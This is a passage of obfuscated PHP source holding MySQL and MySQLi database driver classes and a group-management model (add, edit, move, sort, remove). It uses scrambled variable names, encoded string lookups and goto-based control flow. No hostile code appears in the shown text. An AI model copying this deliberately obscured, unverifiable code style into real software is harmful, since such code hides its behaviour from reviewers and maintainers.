$aËˆÖ¨‚ŸÆ => $fè¬ƒ„£) { $Dİ‹“†¶…ã[$aËˆÖ¨‚ŸÆ] = current($fè¬ƒ„£); } return $Dİ‹“†¶…ã; } public function replace($b‰©å…Æ, $d†ßìº®õ‰ = array()) { $eÙ„Ãä²Ää =& $_SERVER[±á õÁ]; foreach ($b‰©å…Æ as $B„²«–àÁ‡ => $CÙèóÕ¤î×) { $f¦°‘”¤¥ = $this->parseValue($CÙèóÕ¤î×); if (is_scalar($f¦°‘”¤¥)) { $aôÄŞîéî[] = $f¦°‘”¤¥; $bºòÌÁÁ³[] = $this->parseKey($B„²«–àÁ‡); } } $BŒ£Ë‹â– = $eÙ„Ãä²Ää[835] . $this->parseTable($d†ßìº®õ‰[$eÙ„Ãä²Ää[282]]) . $eÙ„Ãä²Ää[836] . implode($eÙ„Ãä²Ää[57], $bºòÌÁÁ³) . $eÙ„Ãä²Ää[837] . implode($eÙ„Ãä²Ää[57], $aôÄŞîéî) . $eÙ„Ãä²Ää[838]; return $this->execute($BŒ£Ë‹â–); } public function insertAll($c—•­öÊ«¸, $fÏƒìÈ¯Üô = array(), $a’ã«‘™ô = false) { goto e³å§·¸¢; e³å§·¸¢: $EçƒÅ²„ÊÌ =& $_SERVER[±á õÁ]; if (!is_array($c—•­öÊ«¸[0])) { return !1; } $cÔÉáêÓã = array_keys($c—•­öÊ«¸[0]); goto eİ»ÔâÉŸ; B¡ÜŠŒÉñ°: $eê—ì´÷ = ($a’ã«‘™ô ? $EçƒÅ²„ÊÌ[840] : $EçƒÅ²„ÊÌ[841]) . $EçƒÅ²„ÊÌ[842] . $this->parseTable($fÏƒìÈ¯Üô[$EçƒÅ²„ÊÌ[282]]) . $EçƒÅ²„ÊÌ[836] . implode($EçƒÅ²„ÊÌ[57], $cÔÉáêÓã) . $EçƒÅ²„ÊÌ[843] . implode($EçƒÅ²„ÊÌ[57], $Ağ’…„¨×); return $this->execute($eê—ì´÷); goto e¡ö…øº; eİ»ÔâÉŸ: $Ağ’…„¨× = array(); foreach ($c—•­öÊ«¸ as $E”„â‘öİå) { $FŒ×¾º‰“¢ = array(); foreach ($E”„â‘öİå as $Bªôéö‹™ö => $B´–äíÒõ) { $B´–äíÒõ = $this->parseValue($B´–äíÒõ); if (is_scalar($B´–äíÒõ)) { $FŒ×¾º‰“¢[] = $B´–äíÒõ; } } $Ağ’…„¨×[] = $EçƒÅ²„ÊÌ[263] . implode($EçƒÅ²„ÊÌ[57], $FŒ×¾º‰“¢) . $EçƒÅ²„ÊÌ[838]; } array_walk($cÔÉáêÓã, array($this, $EçƒÅ²„ÊÌ[839])); goto B¡ÜŠŒÉñ°; e¡ö…øº: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $BÁÔÉ»Öµâ =& $_SERVER[±á õÁ]; $this->error = mysql_errno() . $BÁÔÉ»Öµâ[4] . mysql_error($this->_linkID); if ($BÁÔÉ»Öµâ[43] != $this->queryStr) { $this->error .= LNG($BÁÔÉ»Öµâ[55]) . $this->queryStr; } think_trace($this->error, $BÁÔÉ»Öµâ[43], $BÁÔÉ»Öµâ[56]); return $this->error; } public function escapeString($Eì¹‹¦Ìå) { if ($this->_linkID) { return mysql_real_escape_string($Eì¹‹¦Ìå, $this->_linkID); } else { return mysql_escape_string($Eì¹‹¦Ìå); } } public function parseKey(&$aîÎôõì, $C×êãÖíÑæ = true) { $Cá£ØÂÑ†Ì =& $_SERVER[±á õÁ]; if ($C×êãÖíÑæ) { $aîÎôõì = $this->parseKeyCheck($aîÎôõì); } if ($aîÎôõì != $Cá£ØÂÑ†Ì[190] && !preg_match($Cá£ØÂÑ†Ì[844], $aîÎôõì)) { $aîÎôõì = $Cá£ØÂÑ†Ì[383] . trim($aîÎôõì, $Cá£ØÂÑ†Ì[383]) . $Cá£ØÂÑ†Ì[383]; } return $aîÎôõì; } } class DbMysqli extends Db { public function __construct($eÀ¥Ú‡­ª¹ = '') { $b–¿¸øÚÂ¸ =& $_SERVER[±á õÁ]; if (!extension_loaded($b–¿¸øÚÂ¸[751])) { think_exception(think_lang($b–¿¸øÚÂ¸[20]) . $b–¿¸øÚÂ¸[845]); } if (!empty($eÀ¥Ú‡­ª¹)) { $this->config = $eÀ¥Ú‡­ª¹; if (empty($this->config[$b–¿¸øÚÂ¸[23]])) { $this->config[$b–¿¸øÚÂ¸[23]] = $b–¿¸øÚÂ¸[43]; } } } public function connect($aù‹î…›‰ø = '', $eÓ‰×çÑÃğ = 0) { $CËÆåŒ»’‡ =& $_SERVER[±á õÁ]; if (!isset($this->linkID[$eÓ‰×çÑÃğ])) { goto BŞŒ‹‰ÉˆŠ; BŞŒ‹‰ÉˆŠ: if (empty($aù‹î…›‰ø)) { $aù‹î…›‰ø = $this->config; } $this->linkID[$eÓ‰×çÑÃğ] = new mysqli($aù‹î…›‰ø[$CËÆåŒ»’‡[819]], $aù‹î…›‰ø[$CËÆåŒ»’‡[821]], $aù‹î…›‰ø[$CËÆåŒ»’‡[822]], $aù‹î…›‰ø[$CËÆåŒ»’‡[27]], $aù‹î…›‰ø[$CËÆåŒ»’‡[820]] ? intval($aù‹î…›‰ø[$CËÆåŒ»’‡[820]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto b¹š„‘ä¶; aîŠß«×Ë°: $this->connected = !0; if (1 != think_config($CËÆåŒ»’‡[28])) { unset($this->config); } goto a´ÁíÃÍØÙ; b¹š„‘ä¶: $d‡•Èƒ‹ô’ = $this->linkID[$eÓ‰×çÑÃğ]->server_version; $this->linkID[$eÓ‰×çÑÃğ]->query($CËÆåŒ»’‡[823] . think_config($CËÆåŒ»’‡[824]) . $CËÆåŒ»’‡[65]); if ($d‡•Èƒ‹ô’ > $CËÆåŒ»’‡[825]) { $this->linkID[$eÓ‰×çÑÃğ]->query($CËÆåŒ»’‡[826]); } goto aîŠß«×Ë°; a´ÁíÃÍØÙ: } return $this->linkID[$eÓ‰×çÑÃğ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a÷‰´·ïùŒ) { goto EÄ‘Ö¦Šî¬; A¼„¼³ˆÎ: $this->queryStr = $a÷‰´·ïùŒ; if ($this->queryID) { $this->free(); } think_action_status($Eá…êÛ â[29], 1); goto eÜ™£ƒ‡Û¤; eÜ™£ƒ‡Û¤: think_status($Eá…êÛ â[30]); $this->queryID = $this->_linkID->query($a÷‰´·ïùŒ); if ($this->_linkID->more_results()) { while (($CÄå„ˆÒÏ” = $this->_linkID->next_result()) != NULL) { $CÄå„ˆÒÏ”->free_result(); } } goto D§ŒÖé³ëÀ; EÄ‘Ö¦Šî¬: $Eá…êÛ â =& $_SERVER[±á õÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A¼„¼³ˆÎ; D§ŒÖé³ëÀ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto eÍ¯Ø¯’¶í; eÍ¯Ø¯’¶í: } public function execute($F—Ô§¸æƒ§) { goto Fğœ‹œïÆ; Fğœ‹œïÆ: $Cçí‘’îĞö =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fôéˆŠİì; cœÉ«Ú´: if (!1 === $AÃ·Î¥Çß¶) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto D±½â‚§ê; f‹²Ï‡‡: think_status($Cçí‘’îĞö[30]); $AÃ·Î¥Çß¶ = $this->_linkID->query($F—Ô§¸æƒ§); $this->debug(); goto cœÉ«Ú´; fôéˆŠİì: $this->queryStr = $F—Ô§¸æƒ§; if ($this->queryID) { $this->free(); } think_action_status($Cçí‘’îĞö[31], 1); goto f‹²Ï‡‡; D±½â‚§ê: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A«Ó»ªÉ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$A«Ó»ªÉ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DŠ“Ğ£Òë· = $this->_linkID->rollback(); $this->transTimes = 0; if (!$DŠ“Ğ£Òë·) { $this->error(); return !1; } } return !0; } private function getAll() { $E‘º©¦¥å” = array(); if ($this->numRows > 0) { for ($F¢—Ô¿âø = 0; $F¢—Ô¿âø < $this->numRows; $F¢—Ô¿âø++) { $E‘º©¦¥å”[$F¢—Ô¿âø] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $E‘º©¦¥å”; } public function getFields($aˆßêÍ¿•ë) { $fÎà–ğ—™• =& $_SERVER[±á õÁ]; $AŸØê ‘‘ø = $this->query($fÎà–ğ—™•[830] . $this->parseKey($aˆßêÍ¿•ë)); $d‡ù±¸èóô = array(); if ($AŸØê ‘‘ø) { foreach ($AŸØê ‘‘ø as $CÖ©ˆ‹Í¸ => $Cğ¸±Õ¼) { $d‡ù±¸èóô[$Cğ¸±Õ¼[$fÎà–ğ—™•[37]]] = array($fÎà–ğ—™•[38] => $Cğ¸±Õ¼[$fÎà–ğ—™•[37]], $fÎà–ğ—™•[39] => $Cğ¸±Õ¼[$fÎà–ğ—™•[40]], $fÎà–ğ—™•[41] => (bool) ($Cğ¸±Õ¼[$fÎà–ğ—™•[42]] === $fÎà–ğ—™•[43]), $fÎà–ğ—™•[44] => $Cğ¸±Õ¼[$fÎà–ğ—™•[45]], $fÎà–ğ—™•[46] => strtolower($Cğ¸±Õ¼[$fÎà–ğ—™•[47]]) == $fÎà–ğ—™•[48], $fÎà–ğ—™•[49] => strtolower($Cğ¸±Õ¼[$fÎà–ğ—™•[50]]) == $fÎà–ğ—™•[51]); } } return $d‡ù±¸èóô; } public function getTables($eŞ’‚¡æµ¿ = '') { $AòïæŒåå´ =& $_SERVER[±á õÁ]; $dÜØğøÍ¹ = !empty($eŞ’‚¡æµ¿) ? $AòïæŒåå´[832] . $eŞ’‚¡æµ¿ . $AòïæŒåå´[833] : $AòïæŒåå´[834]; $a‘Ÿ¿ÏìƒÑ = $this->query($dÜØğøÍ¹); $f°ˆ®ªÛ›“ = array(); if ($a‘Ÿ¿ÏìƒÑ) { foreach ($a‘Ÿ¿ÏìƒÑ as $Eê¶ùğ•È¬ => $AçÊ›ëèªÅ) { $f°ˆ®ªÛ›“[$Eê¶ùğ•È¬] = current($AçÊ›ëèªÅ); } } return $f°ˆ®ªÛ›“; } public function replace($F¾Ç÷å’°ƒ, $aùË¨ùèÖª = array()) { $b£‘³Œããä =& $_SERVER[±á õÁ]; foreach ($F¾Ç÷å’°ƒ as $A¸ÜĞÎ¿­à => $FÚ‰À¥ñ) { $bÛ…Ûñíœ½ = $this->parseValue($FÚ‰À¥ñ); if (is_scalar($bÛ…Ûñíœ½)) { $C§–é®Ä¡[] = $bÛ…Ûñíœ½; $Bœä®Ôš®¡[] = $this->parseKey($A¸ÜĞÎ¿­à); } } $EÑ½¨ƒ…‹ = $b£‘³Œããä[835] . $this->parseTable($aùË¨ùèÖª[$b£‘³Œããä[282]]) . $b£‘³Œããä[836] . implode($b£‘³Œããä[57], $Bœä®Ôš®¡) . $b£‘³Œããä[837] . implode($b£‘³Œããä[57], $C§–é®Ä¡) . $b£‘³Œããä[838]; return $this->execute($EÑ½¨ƒ…‹); } public function insertAll($BòÁ·½¿÷â, $c±‚ç¨Õˆ = array(), $dÏá÷°ó± = false) { goto dÒò¾“«œ; FÉöŞ«Î½Ä: $aĞæôº‘…° = array(); foreach ($BòÁ·½¿÷â as $c‹½°àöŠ) { $DœÎ„¾ŞŞ– = array(); foreach ($c‹½°àöŠ as $DÄ×¸×‘À => $E­Ù´å¯…‡) { $E­Ù´å¯…‡ = $this->parseValue($E­Ù´å¯…‡); if (is_scalar($E­Ù´å¯…‡)) { $DœÎ„¾ŞŞ–[] = $E­Ù´å¯…‡; } } $aĞæôº‘…°[] = $e‡ ¼¢è—[263] . implode($e‡ ¼¢è—[57], $DœÎ„¾ŞŞ–) . $e‡ ¼¢è—[838]; } array_walk($EàÔŞ…ëøÕ, array($this, $e‡ ¼¢è—[839])); goto dºá¿ƒõ©ä; dºá¿ƒõ©ä: $a„†¹ïÖˆ¬ = ($dÏá÷°ó± ? $e‡ ¼¢è—[840] : $e‡ ¼¢è—[841]) . $e‡ ¼¢è—[842] . $this->parseTable($c±‚ç¨Õˆ[$e‡ ¼¢è—[282]]) . $e‡ ¼¢è—[836] . implode($e‡ ¼¢è—[57], $EàÔŞ…ëøÕ) . $e‡ ¼¢è—[843] . implode($e‡ ¼¢è—[57], $aĞæôº‘…°); return $this->execute($a„†¹ïÖˆ¬); goto Cš”ôÉ©ÑÈ; dÒò¾“«œ: $e‡ ¼¢è— =& $_SERVER[±á õÁ]; if (!is_array($BòÁ·½¿÷â[0])) { return !1; } $EàÔŞ…ëøÕ = array_keys($BòÁ·½¿÷â[0]); goto FÉöŞ«Î½Ä; Cš”ôÉ©ÑÈ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b—ˆøÖÕ„ñ =& $_SERVER[±á õÁ]; $this->error = $this->_linkID->errno . $b—ˆøÖÕ„ñ[4] . $this->_linkID->error; if ($b—ˆøÖÕ„ñ[43] != $this->queryStr) { $this->error .= LNG($b—ˆøÖÕ„ñ[55]) . $this->queryStr; } think_trace($this->error, $b—ˆøÖÕ„ñ[43], $b—ˆøÖÕ„ñ[56]); return $this->error; } public function escapeString($e–ùÔùÖ©) { if ($this->_linkID) { return $this->_linkID->real_escape_string($e–ùÔùÖ©); } else { return addslashes($e–ùÔùÖ©); } } public function parseKey(&$dŸ¬éì’°¼, $C°Ú¸è’È… = true) { $bœ®¾»à½œ =& $_SERVER[±á õÁ]; if ($C°Ú¸è’È…) { $dŸ¬éì’°¼ = $this->parseKeyCheck($dŸ¬éì’°¼); } if ($dŸ¬éì’°¼ != $bœ®¾»à½œ[190] && !preg_match($bœ®¾»à½œ[844], $dŸ¬éì’°¼)) { $dŸ¬éì’°¼ = $bœ®¾»à½œ[383] . trim($dŸ¬éì’°¼, $bœ®¾»à½œ[383]) . $bœ®¾»à½œ[383]; } return $dŸ¬éì’°¼; } } goto EàÌ¾¹¿Ü¸; Eì·§Óø›: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\155\x65" => "\x67\162\157\x75\160\x5f\x6d\x65\x74\x61", "\x6d\145\164\x61\x46\151\145\x6c\144" => "\147\x72\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($C¨ò›Ã³) { $f›‘—ĞÈ† =& $_SERVER[±á õÁ]; return array($f›‘—ĞÈ†[1692] => array($C¨ò›Ã³[0], $f›‘—ĞÈ†[1693]), $f›‘—ĞÈ†[1694] => array($C¨ò›Ã³[0], $f›‘—ĞÈ†[1693])); } protected function getInfo($C•Û”÷„ÈÓ) { $AäİšÖ·Ê = $this->getInfoSimple($C•Û”÷„ÈÓ); if (!$AäİšÖ·Ê) { return !1; } return $this->_listDataApplyItem($AäİšÖ·Ê); } protected function getInfoSimple($a¿÷õ…î, $BÓÎÕäİ‹† = false) { $cĞ›²¾ãª =& $_SERVER[±á õÁ]; if ($BÓÎÕäİ‹†) { $AÙ¢œ¾±î = array($cĞ›²¾ãª[1621] => intval($a¿÷õ…î)); $bÙ¯—ÜÅÈ– = $this->where($AÙ¢œ¾±î)->find(); return is_array($bÙ¯—ÜÅÈ–) ? $bÙ¯—ÜÅÈ– : array(); } return $this->cacheFunctionGet($cĞ›²¾ãª[1695], $a¿÷õ…î); } protected function groupAdd($D±²‹·Áäê) { goto dš»“’¨æ; AÀÜ¬ã°‹ƒ: if (!empty($D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]])) { $Eá¥Ô×Õ¾ª[$dˆï¨®ÇÊØ[1621]] = $D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]]; } $cŠ”»‚ò™ä = $this->add($Eá¥Ô×Õ¾ª); $this->setNamePinyin($cŠ”»‚ò™ä, $Eá¥Ô×Õ¾ª[$dˆï¨®ÇÊØ[38]]); goto d¸“ÏÎÀĞ; DÓôæ£İŠÜ: if ($F¦Ú˜•Õ›ä[$dˆï¨®ÇÊØ[484]]) { $C×©õÄ§Çˆ = $F¦Ú˜•Õ›ä[$dˆï¨®ÇÊØ[484]] . $F¦Ú˜•Õ›ä[$dˆï¨®ÇÊØ[1621]] . $dˆï¨®ÇÊØ[57]; } $Eá¥Ô×Õ¾ª = array($dˆï¨®ÇÊØ[410] => $this->groupNameAuto($D±²‹·Áäê[$dˆï¨®ÇÊØ[486]], $D±²‹·Áäê[$dˆï¨®ÇÊØ[38]]), $dˆï¨®ÇÊØ[392] => $D±²‹·Áäê[$dˆï¨®ÇÊØ[486]], $dˆï¨®ÇÊØ[550] => $C×©õÄ§Çˆ, $dˆï¨®ÇÊØ[1696] => $D±²‹·Áäê[$dˆï¨®ÇÊØ[1605]], $dˆï¨®ÇÊØ[1697] => 0, $dˆï¨®ÇÊØ[1625] => 0); if (isset($D±²‹·Áäê[$dˆï¨®ÇÊØ[1644]])) { $Eá¥Ô×Õ¾ª[$dˆï¨®ÇÊØ[1644]] = $D±²‹·Áäê[$dˆï¨®ÇÊØ[1644]]; } else { $A­¶¹éÍ¯Æ = $this->max($dˆï¨®ÇÊØ[1644]); if (!$A­¶¹éÍ¯Æ) { $A­¶¹éÍ¯Æ = 0; } $Eá¥Ô×Õ¾ª[$dˆï¨®ÇÊØ[1644]] = $A­¶¹éÍ¯Æ + 1; } goto AÀÜ¬ã°‹ƒ; d¸“ÏÎÀĞ: if (isset($D±²‹·Áäê[$dˆï¨®ÇÊØ[1698]])) { $this->metaSet($cŠ”»‚ò™ä, array($dˆï¨®ÇÊØ[1698] => $D±²‹·Áäê[$dˆï¨®ÇÊØ[1698]], $dˆï¨®ÇÊØ[1699] => $D±²‹·Áäê[$dˆï¨®ÇÊØ[1699]])); unset($D±²‹·Áäê[$dˆï¨®ÇÊØ[1698]]); unset($D±²‹·Áäê[$dˆï¨®ÇÊØ[1699]]); } Model($dˆï¨®ÇÊØ[1138])->groupRootAdd($cŠ”»‚ò™ä); return $cŠ”»‚ò™ä; goto EÜî–´Šå; dš»“’¨æ: $dˆï¨®ÇÊØ =& $_SERVER[±á õÁ]; if (!$D±²‹·Áäê[$dˆï¨®ÇÊØ[486]] && isset($D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]]) && $D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]] == 1) { if ($F¦Ú˜•Õ›ä = $this->getInfoSimple($D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]], !0)) { return $D±²‹·Áäê[$dˆï¨®ÇÊØ[1621]]; } } else { $F¦Ú˜•Õ›ä = $this->getInfoSimple($D±²‹·Áäê[$dˆï¨®ÇÊØ[486]]); if (!$F¦Ú˜•Õ›ä) { return !1; } } $C×©õÄ§Çˆ = $dˆï¨®ÇÊØ[495]; goto DÓôæ£İŠÜ; EÜî–´Šå: } protected function groupEdit($f¶Æ÷¼à´, $BŞ²‰ñí½Š) { $AÚ¡ç•÷„Ú =& $_SERVER[±á õÁ]; if (!empty($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[486]])) { $FÆò•’©´Å = $this->getInfoSimple($f¶Æ÷¼à´); $EÖêö£¼ä = $this->getInfoSimple($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[486]]); if (!$FÆò•’©´Å || !$EÖêö£¼ä) { return !1; } if ($FÆò•’©´Å[$AÚ¡ç•÷„Ú[1621]] == $EÖêö£¼ä[$AÚ¡ç•÷„Ú[1621]]) { return !1; } if ($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[486]] != $FÆò•’©´Å[$AÚ¡ç•÷„Ú[486]]) { if ($EÖêö£¼ä[$AÚ¡ç•÷„Ú[484]] !== $FÆò•’©´Å[$AÚ¡ç•÷„Ú[484]] && strpos($EÖêö£¼ä[$AÚ¡ç•÷„Ú[484]], $FÆò•’©´Å[$AÚ¡ç•÷„Ú[484]] . $FÆò•’©´Å[$AÚ¡ç•÷„Ú[1621]] . $AÚ¡ç•÷„Ú[57]) === 0) { return !1; } $BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[550]] = $EÖêö£¼ä[$AÚ¡ç•÷„Ú[484]] . $BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[486]] . $AÚ¡ç•÷„Ú[57]; $this->_changeChildLevel($FÆò•’©´Å, $EÖêö£¼ä); } } if (isset($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[38]])) { $this->setNamePinyin($f¶Æ÷¼à´, $BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[38]]); } if (isset($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[1698]])) { $this->metaSet($f¶Æ÷¼à´, array($AÚ¡ç•÷„Ú[1698] => $BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[1698]], $AÚ¡ç•÷„Ú[1699] => $BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[1699]])); unset($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[1698]]); unset($BŞ²‰ñí½Š[$AÚ¡ç•÷„Ú[1699]]); } return $this->where(array($AÚ¡ç•÷„Ú[1700] => $f¶Æ÷¼à´))->save($BŞ²‰ñí½Š); } private function _changeChildLevel($D´Óæ›Í…Ñ, $b‰çÜÖóÓİ, $e¢ã­ß†œŸ = false) { goto dÊç­Öò­¶; dÊç­Öò­¶: $DÈ•„ŠÀÛ« =& $_SERVER[±á õÁ]; $aàİù«åŸ„ = $D´Óæ›Í…Ñ[$DÈ•„ŠÀÛ«[484]] . $D´Óæ›Í…Ñ[$DÈ•„ŠÀÛ«[1621]] . $DÈ•„ŠÀÛ«[57]; $D®È¿Ò˜ = $b‰çÜÖóÓİ[$DÈ•„ŠÀÛ«[484]] . $b‰çÜÖóÓİ[$DÈ•„ŠÀÛ«[1621]] . $DÈ•„ŠÀÛ«[57] . $D´Óæ›Í…Ñ[$DÈ•„ŠÀÛ«[1621]] . $DÈ•„ŠÀÛ«[57]; goto Fì’¢Çä©; e‹•Ğ…©º»: $this->where($AŸæ…Çñ)->data($bĞ®Œ¡Ä§ )->save(); goto cê‚¾ ½Ç; Fì’¢Çä©: if ($e¢ã­ß†œŸ) { $D®È¿Ò˜ = $b‰çÜÖóÓİ[$DÈ•„ŠÀÛ«[484]] . $b‰çÜÖóÓİ[$DÈ•„ŠÀÛ«[1621]] . $DÈ•„ŠÀÛ«[57]; } $AŸæ…Çñ = array($DÈ•„ŠÀÛ«[550] => array($DÈ•„ŠÀÛ«[508], $D´Óæ›Í…Ñ[$DÈ•„ŠÀÛ«[484]] . $D´Óæ›Í…Ñ[$DÈ•„ŠÀÛ«[1621]] . $DÈ•„ŠÀÛ«[509])); $bĞ®Œ¡Ä§  = array($DÈ•„ŠÀÛ«[550] => array($DÈ•„ŠÀÛ«[558], "\x72\x65\x70\x6c\x61\143\x65\x28\160\x61\162\145\x6e\164\114\145\166\145\x6c\x2c\47{$aàİù«åŸ„}\47\x2c\x27{$D®È¿Ò˜}\47\51")); goto e‹•Ğ…©º»; cê‚¾ ½Ç: } public function setNamePinyin($F´Ÿ¸Óô¾†, $aÆ÷å‘ç = false) { $b¬Ì™Ó÷Ú =& $_SERVER[±á õÁ]; if (!$aÆ÷å‘ç) { $e§Ì‰­ìù¶ = $this->getInfoSimple($F´Ÿ¸Óô¾†); $aÆ÷å‘ç = $e§Ì‰­ìù¶[$b¬Ì™Ó÷Ú[38]]; } if (!Input::check($aÆ÷å‘ç, $b¬Ì™Ó÷Ú[553])) { $this->metaSet($F´Ÿ¸Óô¾†, $b¬Ì™Ó÷Ú[440], null); $this->metaSet($F´Ÿ¸Óô¾†, $b¬Ì™Ó÷Ú[439], null); return; } $Cö¦Ì¨êÈ = array($b¬Ì™Ó÷Ú[440] => str_replace($b¬Ì™Ó÷Ú[60], $b¬Ì™Ó÷Ú[43], Pinyin::encode($aÆ÷å‘ç)), $b¬Ì™Ó÷Ú[439] => Pinyin::encode($aÆ÷å‘ç, $b¬Ì™Ó÷Ú[554])); $this->metaSet($F´Ÿ¸Óô¾†, $Cö¦Ì¨êÈ); } protected function groupStatus($a´·åÍÒÊ·, $DĞ…á‹Œíº) { goto DÊ«…ì÷ø; Aåï£¼šİ: foreach ($bÖ„æÙÏõ÷ as $a´·åÍÒÊ·) { $CÅõôÖ›½[] = array($D†¶ö¦ÍßÃ[1621] => $a´·åÍÒÊ·, $D†¶ö¦ÍßÃ[99] => $D†¶ö¦ÍßÃ[714], $D†¶ö¦ÍßÃ[375] => $DĞ…á‹Œíº); } return Model($D†¶ö¦ÍßÃ[1701])->addAll($CÅõôÖ›½, array(), !0); goto Fà‰ÀÊÌø¹; B¾•˜ÕÒ¤ò: if ($DĞ…á‹Œíº == $D†¶ö¦ÍßÃ[93]) { $bÖ„æÙÏõ÷ = $this->parentLevelArray($a¹Ç—È¯ƒš[$D†¶ö¦ÍßÃ[484]]); } else { $F÷ÄğíÜŸŠ = array($D†¶ö¦ÍßÃ[550] => array($D†¶ö¦ÍßÃ[508], $a¹Ç—È¯ƒš[$D†¶ö¦ÍßÃ[484]] . $a¹Ç—È¯ƒš[$D†¶ö¦ÍßÃ[1621]] . $D†¶ö¦ÍßÃ[509])); $bÖ„æÙÏõ÷ = $this->where($F÷ÄğíÜŸŠ)->field($D†¶ö¦ÍßÃ[1621])->select(); $bÖ„æÙÏõ÷ = array_to_keyvalue($bÖ„æÙÏõ÷, $D†¶ö¦ÍßÃ[43], $D†¶ö¦ÍßÃ[1621]); } $bÖ„æÙÏõ÷[] = $a¹Ç—È¯ƒš[$D†¶ö¦ÍßÃ[1621]]; $CÅõôÖ›½ = array(); goto Aåï£¼šİ; DÊ«…ì÷ø: $D†¶ö¦ÍßÃ =& $_SERVER[±á õÁ]; $a¹Ç—È¯ƒš = $this->getInfoSimple($a´·åÍÒÊ·); if (!$a¹Ç—È¯ƒš) { return !1; } goto B¾•˜ÕÒ¤ò; Fà‰ÀÊÌø¹: } protected function groupRemove($FË õŞÃù) { goto dà”òÃ½øá; cÌÌ«öÑ‡: Model($dÚÖÈØ¥•¼[776])->groupRootRemove($FË õŞÃù); return $this->where($F„‰ğ¸õÙ¹)->delete(); goto e†À«õ§ËÑ; A‹™˜‚”ç: if (!$dºÉÓèİ¡µ || $dºÉÓèİ¡µ[$dÚÖÈØ¥•¼[486]] == 0) { return !1; } $BÎøØ’ÓÖô = $this->getInfoSimple($dºÉÓèİ¡µ[$dÚÖÈØ¥•¼[486]]); $this->_changeChildLevel($dºÉÓèİ¡µ, $BÎøØ’ÓÖô, !0); goto b°˜‘×´Öœ; b°˜‘×´Öœ: $this->where(array($dÚÖÈØ¥•¼[486] => $FË õŞÃù))->save(array($dÚÖÈØ¥•¼[486] => $dºÉÓèİ¡µ[$dÚÖÈØ¥•¼[486]])); Model($dÚÖÈØ¥•¼[1701])->where($F„‰ğ¸õÙ¹)->delete(); Model($dÚÖÈØ¥•¼[1702])->where($F„‰ğ¸õÙ¹)->delete(); goto cÌÌ«öÑ‡; dà”òÃ½øá: $dÚÖÈØ¥•¼ =& $_SERVER[±á õÁ]; $F„‰ğ¸õÙ¹ = array($dÚÖÈØ¥•¼[1621] => $FË õŞÃù); $dºÉÓèİ¡µ = $this->where($F„‰ğ¸õÙ¹)->find(); goto A‹™˜‚”ç; e†À«õ§ËÑ: } protected function groupSort($B¡ÚÈµñô¾) { $eÄ’¶¥İ‡÷ =& $_SERVER[±á õÁ]; $dÜ®ÈÜçñ† = array(); foreach ($B¡ÚÈµñô¾ as $AÛĞáøƒˆ => $e¤ÉÓ¿ª‹Í) { $dÜ®ÈÜçñ†[] = array($eÄ’¶¥İ‡÷[1621], $e¤ÉÓ¿ª‹Í, $eÄ’¶¥İ‡÷[1644], $AÛĞáøƒˆ + 1); } $this->saveAll($dÜ®ÈÜçñ†); } public function listData() { $C™•ïùŠ¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C™•ïùŠ¢[$_SERVER[±á õÁ][370]]); return $C™•ïùŠ¢; } private function _makeOrder($dß˜½ë²å¶ = '') { goto eÚ­Î±¢¼ô; aÍ•‚¼¤ë: $dß˜½ë²å¶ = $dß˜½ë²å¶ . "{$CÆòöì…ÌÁ}\x20{$cÈ‰«¹‹‡…}\54\x20\147\162\x6f\165\x70\x49\104\40\141\x73\143"; return $this->order($dß˜½ë²å¶); goto eî”ôÚß„Å; eÚ­Î±¢¼ô: $fÃß—‡©†ª =& $_SERVER[±á õÁ]; $C¦­‡Ä–Ñ = array($fÃß—‡©†ª[1621], $fÃß—‡©†ª[38], $fÃß—‡©†ª[1607], $fÃß—‡©†ª[200]); $A¯ÍÈŠ­‘ = array($fÃß—‡©†ª[426] => $fÃß—‡©†ª[427], $fÃß—‡©†ª[428] => $fÃß—‡©†ª[429]); goto F ÇäØ‡•ô; F ÇäØ‡•ô: $CÆòöì…ÌÁ = Input::get($fÃß—‡©†ª[431], $fÃß—‡©†ª[7], $fÃß—‡©†ª[1625], $C¦­‡Ä–Ñ); $cÈ‰«¹‹‡… = Input::get($fÃß—‡©†ª[432], $fÃß—‡©†ª[7], $fÃß—‡©†ª[1703], array($fÃß—‡©†ª[1703], $fÃß—‡©†ª[428])); $cÈ‰«¹‹‡… = $A¯ÍÈŠ­‘[$cÈ‰«¹‹‡…]; goto aÍ•‚¼¤ë; eî”ôÚß„Å: 